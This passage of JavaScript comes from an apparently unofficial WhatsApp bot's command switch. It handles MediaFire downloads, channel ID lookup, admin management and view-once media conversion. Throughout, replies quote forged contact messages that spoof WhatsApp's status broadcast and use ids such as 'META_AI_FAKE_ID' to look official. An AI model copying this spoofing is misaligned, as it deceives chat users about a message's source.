        await socket.sendMessage(sender, { react: { text: '📥', key: msg.key } });

        await socket.sendMessage(sender, {
            text: `╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ⏳
│. • ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...
╰┄『 𝐌𝐄𝐃𝐈𝐀𝐅𝐈𝐑𝐄 𝐌𝐎𝐃𝐔𝐋𝐄 』
`
        }, { quoted: shonux });

        let api = `https://tharuzz-ofc-apis.vercel.app/api/download/mediafire?url=${encodeURIComponent(url)}`;
        let { data } = await axios.get(api);

        if (!data.success || !data.result) {
            return await socket.sendMessage(sender, {
                text: `╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ғᴀɪʟᴇᴅ ❌
│. • ʀᴇᴀsᴏɴ : ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ
╰┄『 𝐌𝐄𝐃𝐈𝐀𝐅𝐈𝐑𝐄 』
`
            }, { quoted: shonux });
        }

        const result = data.result;

        const caption = `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • ғʟᴇ : ${result.title || result.filename}
│. • sɪᴢᴇ : ${result.size}
│. • ᴅᴀᴛᴇ : ${result.date}
│. • sᴛᴀᴛᴜs : ʀᴇᴀᴅʏ ✅
╰┄『 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐒𝐘𝐒𝐓𝐄𝐌 』
`;

        await socket.sendMessage(sender, {
            document: { url: result.url },
            fileName: result.filename,
            mimetype: 'application/octet-stream',
            caption
        }, { quoted: shonux });

    } catch (err) {
        console.error("MediaFire error:", err);

        const shonux = {
            key: {
                remoteJid: "status@broadcast",
                participant: "0@s.whatsapp.net",
                fromMe: false,
                id: "META_AI_MEDIAFIRE"
            },
            message: {
                contactMessage: {
                    displayName: '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓',
                    vcard: `BEGIN:VCARD
VERSION:3.0
N:YOU WEB BOT;;;;
FN:YOU WEB BOT
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
                }
            }
        };

        await socket.sendMessage(sender, {
            text: `╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ɪɴᴛᴇʀɴᴀʟ ғᴀɪʟᴜʀᴇ
╰┄『 𝐌𝐄𝐃𝐈𝐀𝐅𝐈𝐑𝐄 』
`
        }, { quoted: shonux });
    }
    break;
}

// ---------------- list saved newsletters (show emojis) ----------------
case 'ownerlist': {
  try {
    const docs = await listNewslettersFromMongo();

    let userCfg = {};
    try {
      if (number && typeof loadUserConfigFromMongo === 'function') {
        userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {};
      }
    } catch (e) {
      userCfg = {};
    }

    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_OWNERLIST"
      },
      message: {
        contactMessage: {
          displayName: title,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
        }
      }
    };

    if (!docs || docs.length === 0) {
      return await socket.sendMessage(sender, {
        text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇᴍᴘᴛʏ 📭
│. • ᴄʜᴀɴɴᴇʟ : ɴᴏɴᴇ ғᴏᴜɴᴅ
╰┄『 𝐎𝐖𝐍𝐄𝐑 𝐋𝐈𝐒𝐓 』
`
      }, { quoted: shonux });
    }

    let txt = `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│✵ ᴏᴡɴᴇʀ ᴄʜᴀɴɴᴇʟ ʟɪsᴛ
│✵ ᴛᴏᴛᴀʟ : ${docs.length}
`;

    for (let i = 0; i < docs.length; i++) {
      const d = docs[i];
      txt += `│. • ${i + 1}. ${d.jid}
│. • emojis : ${Array.isArray(d.emojis) && d.emojis.length ? d.emojis.join(' ') : 'default'}`;
    }

    txt += `╰┄『 𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑𝐒 』
`;

    await socket.sendMessage(sender, {
      text: txt
    }, { quoted: shonux });

  } catch (e) {
    console.error('ownerlist error', e);

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_OWNERLIST_ERR"
      },
      message: {
        contactMessage: {
          displayName: '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓',
          vcard: `BEGIN:VCARD
VERSION:3.0
N:YOU WEB BOT;;;;
FN:YOU WEB BOT
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
        }
      }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ғᴀɪʟᴇᴅ ᴛᴏ ʟɪsᴛ
╰┄『 𝐎𝐖𝐍𝐄𝐑 𝐋𝐈𝐒𝐓 』
`
    }, { quoted: shonux });
  }

  break;
}

// CID 
          
case 'cid': {
  try {

    const q = msg.message?.conversation
      || msg.message?.extendedTextMessage?.text
      || msg.message?.imageMessage?.caption
      || msg.message?.videoMessage?.caption
      || '';

    const sanitized = String(number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_CID"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
        }
      }
    };

    let channelLink = (args && args.length)
      ? args.join(' ').trim()
      : q.replace(/^[.\/!]cid\s*/i, '').trim();

    if (!channelLink) {
      return await socket.sendMessage(sender, {
        text: `❌ Aucun lien fourni\nUsage: .cid <lien>`
      }, { quoted: shonux });
    }

    const match = channelLink.match(/(?:https?:\/\/)?(?:www\.)?whatsapp\.com\/channel\/([\w-]+)/i);

    if (!match) {
      return await socket.sendMessage(sender, {
        text: `❌ Lien invalide`
      }, { quoted: shonux });
    }

    const inviteId = match[1];

    if (!global.__whatsapp_channel_cache) global.__whatsapp_channel_cache = new Map();

    const cacheKey = `channel_${inviteId}`;
    const cached = global.__whatsapp_channel_cache.get(cacheKey);
    const now = Date.now();

    if (cached && (now - cached._ts) < (10 * 60 * 1000)) {
      const metadata = cached.metadata;

      await socket.sendMessage(sender, {
        text: `📡 ID: ${metadata.id}\n📌 Nom: ${metadata.name || 'unknown'}`
      }, { quoted: shonux });

      break;
    }

    await socket.sendMessage(sender, {
      text: `⏳ Récupération des infos...`
    }, { quoted: shonux });

    const withTimeout = (p, ms = 15000) =>
      Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))]);

    let metadata = null;

    try {
      if (typeof socket.newsletterMetadata === 'function') {
        metadata = await withTimeout(socket.newsletterMetadata("invite", inviteId), 15000);
      } else if (typeof socket.getNewsletterMetadata === 'function') {
        metadata = await withTimeout(socket.getNewsletterMetadata(inviteId), 15000);
      }
    } catch (errMeta) {
      console.warn('[CID] metadata error', errMeta?.message || errMeta);
    }

    if (!metadata || !metadata.id) {
      return await socket.sendMessage(sender, {
        text: '❌ Channel introuvable'
      }, { quoted: shonux });
    }

    const normalized = {
      id: metadata.id || inviteId,
      name: metadata.name || metadata.title || 'unknown',
      subscribers: metadata.subscribers || null,
      preview: metadata.preview || null
    };

    global.__whatsapp_channel_cache.set(cacheKey, {
      metadata: normalized,
      _ts: Date.now()
    });

    const infoText = `📡 ID: ${normalized.id}
📌 Nom: ${normalized.name}
👥 Abonnés: ${normalized.subscribers || 'N/A'}`;

    const previewUrl = normalized.preview
      ? (normalized.preview.startsWith('http')
        ? normalized.preview
        : `https://pps.whatsapp.net${normalized.preview}`)
      : null;

    const interactive = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: infoText },
            footer: { text: botName },
            header: previewUrl
              ? { imageMessage: { url: previewUrl } }
              : { title: "Channel Info" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📋 Copier ID",
                    id: "copy_id",
                    copy_code: normalized.id
                  })
                }
              ]
            }
          }
        }
      }
    };

    try {
      await socket.relayMessage(sender, interactive.viewOnceMessage.message, {
        messageId: `cid_${inviteId}_${Date.now()}`
      });
    } catch (errRelay) {
      console.warn('[CID] fallback', errRelay?.message || errRelay);

      if (previewUrl) {
        try {
          await socket.sendMessage(sender, {
            image: { url: previewUrl },
            caption: infoText
          }, { quoted: shonux });
        } catch {
          await socket.sendMessage(sender, { text: infoText }, { quoted: shonux });
        }
      } else {
        await socket.sendMessage(sender, { text: infoText }, { quoted: shonux });
      }
    }

  } catch (err) {
    console.error("Erreur CID :", err);

    await socket.sendMessage(sender, {
      text: `❌ Erreur: ${err.message}`
    }, { quoted: msg });
  }

  break;
}

case 'addadmin': {
  if (!args || args.length === 0) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADDADMIN" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    return await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ᴘʀᴏᴠɪᴅᴇ ɴᴜᴍʙᴇʀ / ᴊɪᴅ
│. • ᴜsᴀɢᴇ : .ᴀᴅᴅᴀᴅᴍɪɴ <ɴᴜᴍʙᴇʀ>
╰┄『 𝐀𝐃𝐌𝐈𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
    }, { quoted: shonux });
  }

  const jidOr = args[0].trim();
  if (!isOwner) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADDADMIN2" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    return await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ ❌
│. • ʀᴇᴀsᴏɴ : ᴏᴡɴᴇʀ ᴏɴʟʏ
╰┄『 𝐀𝐃𝐌𝐈𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
    }, { quoted: shonux });
  }

  try {
    await addAdminToMongo(jidOr);

    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADDADMIN3" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : sᴜᴄᴄᴇss ᴄᴏɴғɪʀᴍᴇᴅ ✅
│. • ᴍᴏᴅᴇ : ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ
│. • ᴛᴀʀɢᴇᴛ : ${jidOr}
╰┄『 𝐀𝐃𝐌𝐈𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
    }, { quoted: shonux });

  } catch (e) {
    console.error('addadmin error', e);

    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADDADMIN4" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ${e.message}
╰┄『 𝐀𝐃𝐌𝐈𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
    }, { quoted: shonux });
  }
  break;
}


case 'deladmin': {
  if (!args || args.length === 0) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_DELADMIN1" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    return await socket.sendMessage(sender, { text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ɴᴏ ɪɴᴘᴜᴛ ᴘʀᴏᴠɪᴅᴇᴅ
│. • ᴜsᴀɢᴇ : .ᴅᴇʟᴀᴅᴍɪɴ <ɴᴜᴍʙᴇʀ>
╰┄『 𝐀𝐃𝐌𝐈𝐍 𝐌𝐎𝐃𝐔𝐋𝐄 』
` }, { quoted: shonux });
  }

  const jidOr = args[0].trim();

  if (!isOwner) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_DELADMIN2" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    return await socket.sendMessage(sender, { text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴅᴇɴɪᴇᴅ ❌
│. • ʀᴇᴀsᴏɴ : ɴᴏ ᴀᴄᴄᴇss
╰┄『 𝐏𝐄𝐑𝐌𝐈𝐒𝐒𝐈𝐎𝐍 𝐁𝐋𝐎𝐂𝐊 』
` }, { quoted: shonux });
  }

  try {
    await removeAdminFromMongo(jidOr);

    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_DELADMIN3" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    await socket.sendMessage(sender, { text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : sᴜᴄᴄᴇss ✅
│. • ᴀᴅᴍɪɴ : ʀᴇᴍᴏᴠᴇᴅ
│. • ᴛᴀʀɢᴇᴛ : ${jidOr}
╰┄『 𝐀𝐃𝐌𝐈𝐍 𝐌𝐎𝐃𝐔𝐋𝐄 』
` }, { quoted: shonux });

  } catch (e) {
    console.error('deladmin error', e);

    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_DELADMIN4" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    await socket.sendMessage(sender, { text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ${e.message}
╰┄『 𝐄𝐑𝐑𝐎𝐑 𝐌𝐎𝐃𝐔𝐋𝐄 』
` }, { quoted: shonux });
  }
  break;
}


case 'tovv':  
case 'toviewonce': {  
  try {  

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: { text: "👁️", key: msg.key }
    });

    // ===== GET QUOTED MESSAGE (NO m) =====
    const contextInfo =
      msg.message?.extendedTextMessage?.contextInfo;

    const quotedMsg = contextInfo?.quotedMessage;

    if (!quotedMsg) {
      return await socket.sendMessage(sender, {
        text: "❌ reply to image, video or audio"
      }, { quoted: msg });
    }

    const type =
      quotedMsg.imageMessage ? "image" :
      quotedMsg.videoMessage ? "video" :
      quotedMsg.audioMessage ? "audio" :
      null;

    if (!type) {
      return await socket.sendMessage(sender, {
        text: "❌ only image, video or audio supported"
      }, { quoted: msg });
    }

    const mediaMsg = quotedMsg[type + "Message"];

    // ===== DOWNLOAD SAFE =====
    const stream = await downloadContentFromMessage(mediaMsg, type);

    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }

    if (!buffer) {
      return await socket.sendMessage(sender, {
        text: "❌ download failed"
      }, { quoted: msg });
    }

    // ===== IMAGE VIEWONCE =====
    if (type === "image") {
      await socket.sendMessage(sender, {
        image: buffer,
        viewOnce: true,
        caption: "👁️ view once image"
      }, { quoted: msg });
    }

    // ===== VIDEO VIEWONCE =====
    if (type === "video") {
      await socket.sendMessage(sender, {
        video: buffer,
        viewOnce: true,
        caption: "👁️ view once video"
      }, { quoted: msg });
    }

    // ===== AUDIO =====
    if (type === "audio") {
      await socket.sendMessage(sender, {
        audio: buffer,
        mimetype: "audio/mp4",
        ptt: true
      }, { quoted: msg });

      await socket.sendMessage(sender, {
        text: "🎧 audio sent (listen once style)"
      });
    }

    // ===== SUCCESS REACT =====
    await socket.sendMessage(sender, {
      react: { text: "✅", key: msg.key }
    });

  } catch (e) {
    console.error("TOVV ERROR:", e);

    await socket.sendMessage(sender, {
      text: "❌ failed to process media"
    }, { quoted: msg });
  }
}
break;

           

case 'admins': {
  try {
    const list = await loadAdminsFromMongo();

    let userCfg = {};
    try { 
      if (number && typeof loadUserConfigFromMongo === 'function') 
        userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; 
    } catch(e){ userCfg = {}; }

    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: { 
        remoteJid: "status@broadcast", 
        participant: "0@s.whatsapp.net", 
        fromMe: false, 
        id: "META_AI_FAKE_ID_ADMINS" 
      },
      message: { 
        contactMessage: { 
          displayName: title, 
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` 
        } 
      }
    };

    if (!list || list.length === 0) {
      return await socket.sendMessage(sender, { 
        text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇᴍᴘᴛʏ ❌
│. • ᴍᴇssᴀɢᴇ : ɴᴏ ᴀᴅᴍɪɴs ғᴏᴜɴᴅ
╰┄『 𝐀𝐃𝐌𝐈𝐍𝐒 𝐋𝐈𝐒𝐓 』
`
      }, { quoted: shonux });
    }

    let txt = `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│✵ ᴄᴏɴғɪɢ : ᴀᴅᴍɪɴs ᴅʙ
│✵ ᴛᴏᴛᴀʟ : ${list.length}
│ ⊹ ࣪ ˖👑 𝐋𝐈𝐒𝐓𝐄 𝐃𝐄𝐒 𝐀𝐃𝐌𝐈𝐍𝐒 👑\n│ ⊹ ࣪ ˖`;

    for (const a of list) txt += `│ ⊹ ࣪ ˖• ᴀᴅᴍɪɴ ➤ ${a}\n`;

    txt += `\n╰┄『 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 』`;

    // 🔥 IMAGE AJOUTÉE ICI (sans changer logique)
    await socket.sendMessage(sender, {
      image: { url: 'https://i.postimg.cc/yxjgrx9H/WA-1777204234222.jpg' },
      caption: txt
    }, { quoted: shonux });

  } catch (e) {
    console.error('admins error', e);

    let userCfg = {};
    try { 
      if (number && typeof loadUserConfigFromMongo === 'function') 
        userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; 
    } catch(e){ userCfg = {}; }

    const title = userCfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: { 
        remoteJid: "status@broadcast", 
        participant: "0@s.whatsapp.net", 
        fromMe: false, 
        id: "META_AI_FAKE_ID_ADMINS2" 
      },
      message: { 
        contactMessage: { 
          displayName: title, 
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` 
        } 
      }
    };

    await socket.sendMessage(sender, { 
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ғᴀɪʟᴇᴅ ᴛᴏ ʟɪsᴛ
╰┄『 𝐀𝐃𝐌𝐈𝐍𝐒 𝐄𝐑𝐑𝐎𝐑 』
`
    }, { quoted: shonux });
  }
  break;
}


case 'jid': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || '𝐘𝐎𝐔-𝐌𝐃 𝐌𝐈𝐍𝐈';
    const userNumber = sender.split('@')[0];

    // Reaction
    await socket.sendMessage(sender, { react: { text: "🆔", key: msg.key } });

    // Fake contact quoting for meta style
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_FAKE_ID" },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:BASEBOT-MD\nTEL;type=CELL;type=VOICE;waid=${userNumber}:${userNumber}\nEND:VCARD`
        }
      }
    };

    // Texte principal
    const mainText = `*🆔 ᴄʜᴀᴛ ᴊɪᴅ:* ${sender}\n*📞 ʏᴏᴜʀ ɴᴜᴍʙᴇʀ:* +${userNumber}`;

    // Construire le message interactif avec bouton "copy"
    const interactive = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: mainText },
            footer: { text: "> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*" },
            header: { hasMediaAttachment: false, title: "Identifiant de chat" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📋 ᴄᴏᴘɪᴇʀ ᴊɪᴅ",
                    id: "copy_jid",
                    copy_code: sender
                  })
                }
              ]
            }
          }
        }
      }
    };

    // Envoyer le message interactif (un seul envoi, quoted pour style)
    await socket.relayMessage(sender, interactive.viewOnceMessage.message, { messageId: `jid_${Date.now()}` });
    // Envoyer aussi en quoted pour conserver l'apparence "meta" (optionnel)
    await socket.sendMessage(sender, { text: mainText }, { quoted: shonux });

  } catch (e) {
    console.error('JID ERROR', e);
    try {
      await socket.sendMessage(sender, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
    } catch (err) { /* ignore */ }
  }
  break;
}
// use inside your switch(command) { ... } block

case 'setpath': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  const senderNum = (nowsender || '').split('@')[0];
  const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

  // Vérification des permissions
  if (senderNum !== sanitized && senderNum !== ownerNum) {
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH1" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    await socket.sendMessage(sender, {
      text: `
